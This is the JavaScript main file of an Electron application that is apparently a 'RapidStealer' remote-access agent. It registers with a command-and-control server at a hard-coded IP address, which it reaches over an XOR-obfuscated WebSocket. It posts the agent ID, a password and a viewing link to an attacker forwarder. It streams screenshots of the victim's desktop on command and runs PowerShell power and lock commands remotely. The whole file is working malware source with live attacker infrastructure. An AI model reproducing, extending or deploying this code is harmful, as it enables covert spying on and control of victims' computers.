const { app, BrowserWindow, ipcMain, Tray, Menu, desktopCapturer } = require('electron');
const WebSocket = require('ws');
const path = require('path');
const http = require('http');
const { exec } = require('child_process');
const crypto = require('crypto');

const SERVER_URL = 'ws://46.151.182.157:571';
const AGENT_ID = Math.random().toString(36).slice(2, 10).toUpperCase();
const KEY = app.isPackaged ? (process.argv[1] || null) : (process.argv[2] || null);
const AGENT_PASSWORD = 'RapidAdmin2024!';

// ── XOR encryption (matching the C2 panel) ──
const MASTER_KEY = 'RapidStealer_2024_SecureKey_571';
const AUTH_TOKEN = crypto.createHash('sha256').update(MASTER_KEY).digest('hex').slice(0, 32);

function encrypt(text) {
  let result = '';
  for (let i = 0; i < text.length; i++) {
    result += String.fromCharCode(text.charCodeAt(i) ^ MASTER_KEY.charCodeAt(i % MASTER_KEY.length));
  }
  return Buffer.from(result, 'latin1').toString('base64');
}

function decrypt(ciphertext) {
  try {
    const decoded = Buffer.from(ciphertext, 'base64').toString('latin1');
    let result = '';
    for (let i = 0; i < decoded.length; i++) {
      result += String.fromCharCode(decoded.charCodeAt(i) ^ MASTER_KEY.charCodeAt(i % MASTER_KEY.length));
    }
    return result;
  } catch (e) {
    console.error('[DECRYPT] error:', e.message);
    return null;
  }
}

function sendSecure(ws, obj) {
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(encrypt(JSON.stringify(obj)));
  }
}

function sendForward(key) {
  if (!key) {
    console.log('[FORWARD] No KEY provided, skipping...');
    return;
  }

  console.log('[FORWARD] Sending with KEY:', key);

  const payload = JSON.stringify({
    key,
    username: "t.me/rapidstealerxx",
    avatar_url: "https://cdn.discordapp.com/attachments/1267444884495798283/1436475079927009362/cover_1.png?ex=690fbd2b&is=690e6bab&hm=8b7f7b7c597dcf11791ecf46479c99656c625760d6953dff5c3ac92ea6865a73&",
    embeds: [{
      author: {
        name: "t.me/rapidstealerxx - Stream Session",
        icon_url: "https://cdn.discordapp.com/attachments/1267444884495798283/1436475079927009362/cover_1.png?ex=690fbd2b&is=690e6bab&hm=8b7f7b7c597dcf11791ecf46479c99656c625760d6953dff5c3ac92ea6865a73&"
      },
      color: 0x000000,
      fields: [
        { name: 'Status', value: '<:connected:1490340889824985150>', inline: true },
        { name: 'AgentID', value: '`'+AGENT_ID+'`', inline: true },
        { name: 'Password', value: '`'+AGENT_PASSWORD+'`', inline: true },
        { name: 'View', value: '[Click to View!](http://46.151.182.157:571/'+AGENT_ID+")", inline: true }
      ],
      footer: {
        text: `@RapidStealer | t.me/rapidstealerxx | ${key}`,
        icon_url: "https://media.discordapp.net/attachments/1266493389365448754/1425475767252291724/cover_1.png?ex=68e7b942&is=68e667c2&hm=7009f2f6f58fc9e65e519cfa7b051b78aee9db70503f73e952db0499ceab985f&",
      },
      thumbnail: {
        url: "https://media.discordapp.net/attachments/1266493389365448754/1425475767252291724/cover_1.png?ex=68e7b942&is=68e667c2&hm=7009f2f6f58fc9e65e519cfa7b051b78aee9db70503f73e952db0499ceab985f&"
      },
    }]
  });

  const options = {
    hostname: '46.151.182.157',
    port: 2008,
    path: '/api/forwarder',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', d => body += d);
    res.on('end', () => console.log('[FORWARD] status:', res.statusCode, body));
  });
  req.on('error', (e) => console.error('[FORWARD] error:', e.message));
  req.write(payload);
  req.end();
}

const PS_COMMANDS = {
  shutdown: 'Stop-Computer -Force',
  restart:  'Restart-Computer -Force',
  sleep:    'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Application]::SetSuspendState("Suspend", $false, $false)',
  logout:   'logoff',
  lock:     'rundll32.exe user32.dll,LockWorkStation',
};

function runPowerShell(command) {
  const cmd = `powershell -NonInteractive -Command "${command.replace(/"/g, '\\"')}"`;
  exec(cmd, (err, stdout, stderr) => {
    if (err) console.error('[PS] error:', stderr || err.message);
    else console.log('[PS] output:', stdout);
  });
}

let chatWindow = null;
let tray = null;
let ws = null;
let screenInterval = null;
let isAuthenticated = false;

function connectWS() {
    ws = new WebSocket(SERVER_URL, [], {
    headers: { 'User-Agent': 'Electron/RapidStealer' }
  });

  ws.on('open', () => {
    // Authentication handshake: send auth token, wait for success
    sendSecure(ws, { type: 'auth', token: AUTH_TOKEN });
  });

  ws.on('message', (data) => {
    // Try decrypting first (new encrypted protocol)
    const decrypted = decrypt(data);
    if (decrypted) {
      try {
        const msg = JSON.parse(decrypted);
        handleMessage(msg);
        return;
      } catch {}
    }

    // Fallback: raw JSON (old protocol or non-encrypted messages)
    try {
      const msg = JSON.parse(data);
      handleMessage(msg);
    } catch {}
  });

  ws.on('close', () => {
    isAuthenticated = false;
    setTimeout(connectWS, 5000);
  });

  ws.on('error', () => {});
}

function handleMessage(msg) {
  // Authentication handshake
  if (msg.type === 'auth_success') {
    isAuthenticated = true;
    sendSecure(ws, { type: 'register_agent', agentId: AGENT_ID });
    return;
  }
  if (msg.type === 'auth_failed') {
    console.error('[AUTH] Authentication failed:', msg.reason);
    ws.close();
    return;
  }

  if (!isAuthenticated) return;

  if (msg.type === 'chat') {
    showChatWindow();
    if (chatWindow) {
      chatWindow.webContents.send('incoming-message', { text: msg.text, ts: msg.ts });
    }
  }

  if (msg.type === 'start_screen') startScreenCapture();
  if (msg.type === 'stop_screen')  stopScreenCapture();

  if (msg.type === 'powershell_cmd') {
    const psCmd = PS_COMMANDS[msg.command];
    if (psCmd) runPowerShell(psCmd);
  }
}

function showChatWindow() {
  if (chatWindow && !chatWindow.isDestroyed()) {
    chatWindow.show();
    chatWindow.focus();
    return;
  }

  chatWindow = new BrowserWindow({
    width: 380,
    height: 520,
    resizable: false,
    alwaysOnTop: true,
    frame: false,
    skipTaskbar: false,
    icon: path.join(__dirname, 'icon.ico'),
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, 'preload.js')
    }
  });

  chatWindow.loadFile(path.join(__dirname, 'chat.html'));
  chatWindow.on('closed', () => { chatWindow = null; });
}

ipcMain.on('send-message', (_event, text) => {
  if (ws && ws.readyState === WebSocket.OPEN) {
    sendSecure(ws, { type: 'chat', text });
  }
});

ipcMain.on('close-window', () => {
  if (chatWindow) chatWindow.hide();
});

ipcMain.on('start-screen', () => startScreenCapture());
ipcMain.on('stop-screen',  () => stopScreenCapture());

async function startScreenCapture() {
  if (screenInterval) return;
  screenInterval = setInterval(async () => {
    if (!ws || ws.readyState !== WebSocket.OPEN) return;
    try {
      const sources = await desktopCapturer.getSources({
        types: ['screen'],
        thumbnailSize: { width: 1920, height: 1080 }
      });
      if (!sources.length) return;
      const jpeg = sources[0].thumbnail.toJPEG(60);
      const header = Buffer.from(JSON.stringify({ type: 'screen_frame' }) + '\n');
      ws.send(Buffer.concat([header, jpeg]));
    } catch {}
  }, 100);
}

function stopScreenCapture() {
  if (screenInterval) {
    clearInterval(screenInterval);
    screenInterval = null;
  }
}

app.whenReady().then(() => {
  sendForward(KEY);
  connectWS();
});

app.on('window-all-closed', (e) => {
  e.preventDefault();
});
